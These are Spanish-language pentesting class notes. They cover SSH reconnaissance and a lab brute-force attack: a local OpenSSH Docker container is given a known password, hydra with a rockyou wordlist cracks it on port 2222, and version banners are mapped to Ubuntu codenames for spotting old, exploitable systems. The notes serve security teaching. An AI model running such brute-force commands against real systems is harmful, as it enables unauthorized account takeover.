En esta clase, exploraremos el protocolo **SSH** (**Secure Shell**) y cómo realizar reconocimiento para recopilar información sobre los sistemas que ejecutan este servicio.

SSH es un protocolo de administración remota que permite a los usuarios **controlar** y **modificar** sus servidores remotos a través de Internet mediante un mecanismo de **autenticación seguro**. Como una alternativa más segura al protocolo **Telnet**, que transmite información sin cifrar, SSH utiliza **técnicas criptográficas** para garantizar que todas las comunicaciones hacia y desde el servidor remoto estén cifradas.

SSH proporciona un mecanismo para autenticar un usuario remoto, transferir entradas desde el cliente al host y retransmitir la salida de vuelta al cliente. Esto es especialmente útil para administrar sistemas remotos de manera segura y eficiente, sin tener que estar físicamente presentes en el sitio.

A continuación, se os proporciona el enlace directo a la web donde copiamos todo el comando de ‘docker’ para desplegar nuestro contenedor:

- **Docker Hub OpenSSH-Server**: [https://hub.docker.com/r/linuxserver/openssh-server](https://hub.docker.com/r/linuxserver/openssh-server)

En esta ocasión haremos fuerza bruta a un usuario pero esta vez por ssh en esta ocasion configuramos el contenedor con la contreña louise:
```d
docker run -d \              
  --name=openssh-server \
  --hostname=hack4u-academy \
  -e PUID=1000 \
  -e PGID=1000 \
  -e TZ=Etc/UTC \
  -e PASSWORD_ACCESS=true \
  -e USER_PASSWORD=louise \
  -e USER_NAME=s4vitar \
  -p 2222:2222 \
  -v /path/to/appdata/config:/config \
  --restart unless-stopped \
  lscr.io/linuxserver/openssh-server:latest
```

y el ataque con hydra es bastante parecido al anterior de ftp solo que cambiamos el protocolo y indicamos que sea por el puerto 2222
```bash
hydra -l s4vitar -P /usr/share/SecLists/Passwords/Leaked-Databases/rockyou-15.txt ssh://127.0.0.1 -s 2222 -t 4
# con -s indicamos el puerto por el que queremos conectarnos

[DATA] attacking ssh://127.0.0.1:2222/
[2222][ssh] host: 127.0.0.1   login: s4vitar   password: louise
```

Ya teniendo la contraseña solo queda conectarse por ssh `ssh s4vitar@127.0.0.1` e indicar la contraseña que encontramos con hydra

---
Cabe destacar que a través de la versión de SSH, también podemos identificar el codename de la distribución que se está ejecutando en el sistema.

Por ejemplo, si la versión del servidor SSH es “**OpenSSH 8.2p1 Ubuntu 4ubuntu0.5**“, podemos determinar que el sistema está ejecutando una distribución de Ubuntu. El número de versión “**4ubuntu0.5**” se refiere a la revisión específica del paquete de SSH en esa distribución de Ubuntu. A partir de esto, podemos identificar el **codename** de la distribución de Ubuntu, que en este caso sería “**Focal**” para Ubuntu 20.04.

Todas estas búsquedas las aplicamos sobre el siguiente dominio:

- **Launchpad**: [https://launchpad.net/ubuntu](https://launchpad.net/ubuntu)

```d
   1   │ FROM ubuntu:14.04
   2   │ MAINTAINER agus "a@gmail.com"
   3   │ 
   4   │ EXPOSE 22
   5   │ 
   6   │ RUN apt update && apt install ssh -y
   7   │ 
   8   │ ENTRYPOINT service ssh start && /bin/bash
```

cuando encontramos una version con nmap -sCV ponemos en el buscador la version que nso da y lo acompañamos con launchpad al final para podes averiguar el codename
![[launchpad_image.png]]

Como auditor o analista de seguridad, es crucial de cara a los informes destacar toda la información que un atacante pueda recopilar durante una fase de reconocimiento inicial. Esta información podría ser particularmente relevante para la escalada de privilegios. Por ejemplo, si identificamos que estamos ante un sistema Ubuntu antiguo, es probable que el kernel pueda ser explotado para elevar privilegios. Además, saber que se trata de un sistema Ubuntu obsoleto podría indicar que las versiones de Bash en uso sean también antiguas, lo que podría hacer que el sistema sea vulnerable a un ataque ShellShock, entre otros posibles riesgos. Puedes adelantar ciertas jugadas, no a nivel de explotación directa pero si a nivel de posibles vectores que más adelante puedas explotar. Es probable que incluso para ciertas versiones antiguas de Ubuntu, logres encontrar algún exploit remoto en el mejor de los casos, de una vulnerabilidad crítica existente que te permita ejecutar comandos en el servidor sin estar autenticado, por ejemplo.